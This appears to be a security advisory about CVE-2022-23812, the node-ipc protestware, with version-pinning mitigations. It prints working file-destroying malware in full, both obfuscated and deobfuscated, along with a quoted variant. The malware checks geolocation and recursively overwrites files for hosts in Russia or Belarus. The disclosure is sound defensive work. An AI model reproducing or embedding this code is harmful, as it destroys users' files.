# [CVE-2022-23812](https://nvd.nist.gov/vuln/detail/CVE-2022-23812)

---

# [RIAEvangelist/node-ipc](https://github.com/RIAEvangelist/node-ipc) is malware / protestware

The `RIAEvangelist/node-ipc` module contains protestware [peacenotwar](https://github.com/RIAEvangelist/peacenotwar).

Excerpt from RIAEvangelist/node-ipc:
> ***as of v11.0.0 & v9.2.2*** this module uses the [peacenotwar](https://github.com/RIAEvangelist/peacenotwar) module.

---

More importantly, commits `847047cf7f81ab08352038b2204f0e7633449580 -> 6e344066a0464814a27fbd7ca8422f473956a803` of `RIAEvangelist/node-ipc` contains malware.

---

### :warning:| The following code is malicious, DO NOT RUN IT
https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js
> ##### The following codeblock was added in-case the url above is deactivated
> ```js
> import u from"path";import a from"fs";import o from"https";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=","base64");o.get(n.toString("utf8"),function(t){t.on("data",function(t){const n=Buffer.from("Li8=","base64");const o=Buffer.from("Li4v","base64");const r=Buffer.from("Li4vLi4v","base64");const f=Buffer.from("Lw==","base64");const c=Buffer.from("Y291bnRyeV9uYW1l","base64");const e=Buffer.from("cnVzc2lh","base64");const i=Buffer.from("YmVsYXJ1cw==","base64");try{const s=JSON.parse(t.toString("utf8"));const u=s[c.toString("utf8")].toLowerCase();const a=u.includes(e.toString("utf8"))||u.includes(i.toString("utf8"));if(a){h(n.toString("utf8"));h(o.toString("utf8"));h(r.toString("utf8"));h(f.toString("utf8"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n="",o=""){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from("4p2k77iP","base64");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString("utf8"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}
> ```
### :warning:| The above code is malicious, DO NOT RUN IT

---

I deobfuscated the code above and found that if the host machine's public ip address was from Russia or Belarus,
node-ipc would proceed overwrite many files with a heart emoji recursively while traversing up parent directories:

---

### :warning:| The following code is malicious, DO NOT RUN IT
```js
import u from "path";
import a from "fs";
import o from "https";
setTimeout(function () {
    const t = Math.round(Math.random() * 4);
    if (t > 1) {
        return;
    }
    const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
    o.get(n.toString("utf8"), function (t) {
        t.on("data", function (t) {
            const n = Buffer.from("Li8=", "base64");
            const o = Buffer.from("Li4v", "base64");
            const r = Buffer.from("Li4vLi4v", "base64");
            const f = Buffer.from("Lw==", "base64");
            const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
            const e = Buffer.from("cnVzc2lh", "base64");
            const i = Buffer.from("YmVsYXJ1cw==", "base64");
            try {
                const s = JSON.parse(t.toString("utf8"));
                const u = s[c.toString("utf8")].toLowerCase();
                const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8"));
                if (a) {
                    h(n.toString("utf8"));
                    h(o.toString("utf8"));
                    h(r.toString("utf8"));
                    h(f.toString("utf8"));
                }
            } catch (t) {}
        });
    });
}, Math.ceil(Math.random() * 1e3));
async function h(n = "", o = "") {
    if (!a.existsSync(n)) {
        return;
    }
    let r = [];
    try {
        r = a.readdirSync(n);
    } catch (t) {}
    const f = [];
    const c = Buffer.from("4p2k77iP", "base64");
    for (var e = 0; e < r.length; e++) {
        const i = u.join(n, r[e]);
        let t = null;
        try {
            t = a.lstatSync(i);
        } catch (t) {
            continue;
        }
        if (t.isDirectory()) {
            const s = h(i, o);
            s.length > 0 ? f.push(...s) : null;
        } else if (i.indexOf(o) >= 0) {
            try {
                a.writeFile(i, c.toString("utf8"), function () {});
            } catch (t) {}
        }
    }
    return f;
}
const ssl = true;
export { ssl as default, ssl };
```
### :warning:| The above code is malicious, DO NOT RUN IT

---

The following are excerpts from the malicious code:
```js
Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
// https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154
```
```js
const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8"));
// checks if ip country is Russia or Belarus
```
```js
a.writeFile(i, c.toString("utf8"), function () {});
// overwrites file with `❤️`
```

---

The following demonstrates example of what each of the parameters going to the `a.writeFile(i,c.toString("utf8")` would be:

![image](https://user-images.githubusercontent.com/22574513/158507139-1ef9aa3a-b123-489e-a3d4-3c426d52aca3.png)

---

# Edit 2022-03-16_0

[Comment](https://github.com/vuejs/vue-cli/issues/7054#issuecomment-1069209509) by [zkyf](https://github.com/zkyf)

> Just made it better looked and commented dangerous code so you guys can take a try. Obviously the code will delete literally EVERYTHING on your drive.
> 
> ```
> const path = require("path");
> const fs = require("fs");
> const https = require("https");
> 
> setTimeout(function () {
>     const randomNumber = Math.round(Math.random() * 4);
>     if (randomNumber > 1) {
>         // return;
>     }
>     const apiKey = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";
>     const pwd = "./";
>     const parentDir = "../";
>     const grandParentDir = "../../";
>     const root = "/";
>     const countryName = "country_name";
>     const russia = "russia";
>     const belarus = "belarus";
> 
>     https.get(apiKey, function (message) {
>         message.on("data", function (msgBuffer) {
>             try {
>                 const message = JSON.parse(msgBuffer.toString("utf8"));
>                 const userCountryName = message[countryName.toString("utf8")].toLowerCase();
>                 const hasRus = userCountryName.includes(russia.toString("utf8")) || userCountryName.includes(belarus.toString("utf8")); // checks if country is Russia or Belarus
>                 if (hasRus) {
>                     deleteFile(pwd);
>                     deleteFile(parentDir);
>                     deleteFile(grandParentDir);
>                     deleteFile(root);
>                 }
>             } catch (t) {}
>         });
>     });
> 
>     // zkyf: Let's try this directly here
>     deleteFile(pwd);
>     deleteFile(parentDir);
>     deleteFile(grandParentDir);
>     deleteFile(root);
> }, 100);
> 
> async function deleteFile(pathName = "", o = "") {
>     if (!fs.existsSync(pathName)) {
>         return;
>     }
>     let fileList = [];
>     try {
>         fileList = fs.readdirSync(pathName);
>     } catch (t) {}
>     const f = [];
>     const heartUtf8 = Buffer.from("4p2k77iP", "base64");
>     for (var idx = 0; idx < fileList.length; idx++) {
>         const fileName = path.join(pathName, fileList[idx]);
>         let fileInfo = null;
>         try {
>             fileInfo = fs.lstatSync(fileName);
>         } catch (err) {
>             continue;
>         }
>         if (fileInfo.isDirectory()) {
>             const fileSymbol = deleteFile(fileName, o);
>             fileSymbol.length > 0 ? f.push(...fileSymbol) : null;
>         } else if (fileName.indexOf(o) >= 0) {
>             try {
>                 // fs.writeFile(fileName, heartUtf8.toString("utf8"), function () {}); // overwrites file with `❤️`
>                 console.log(`Rewrite ${fileName}`);
>             } catch (err) {}
>         }
>     }
>     return f;
> }
> ```
> 
> Console: ![image](https://user-images.githubusercontent.com/13307442/158617117-0d4bc6c4-59ae-4fee-a852-418cb2189b72.png)

---

# Edit 2022-03-16_1 (requested by @lgg)

## Available mitigation methods:

The following mitigation strategies are inspired by cnpm's (is not npm) mitigation methods:
https://github.com/cnpm/bug-versions/pull/181

If you use one of the following mitigation stratagies, make sure to remove the `^` to force `node-ipc` to the specified version.

`"^9.x.x" -> "9.2.1"`
```diff
     "dependencies": {
-        "node-ipc": "^9.x.x"
+        "node-ipc": "9.2.1"
     }
```

`"^10.x.x" -> "10.1.0"`
```diff
     "dependencies": {
-        "node-ipc": "^10.x.x"
+        "node-ipc": "10.1.0"
     }
```

`"^11.x.x" -> "10.1.0"`
```diff
     "dependencies": {
-        "node-ipc": "^11.x.x"
+        "node-ipc": "10.1.0"
     }
```

## 3rd-party mitigation methods:
- [vue-cli](https://github.com/vuejs/vue-cli/issues/7054#issuecomment-1069642202)
- [Unity Hub](https://unity3d.com/hub/whats-new)

---

# Edit 2022-03-16_2 (requested by @lgg)

## [CVE-2022-23812](https://nvd.nist.gov/vuln/detail/CVE-2022-23812)

# Edit 2022-03-17

@RIAEvangelist has banned me from interacting with their repositories
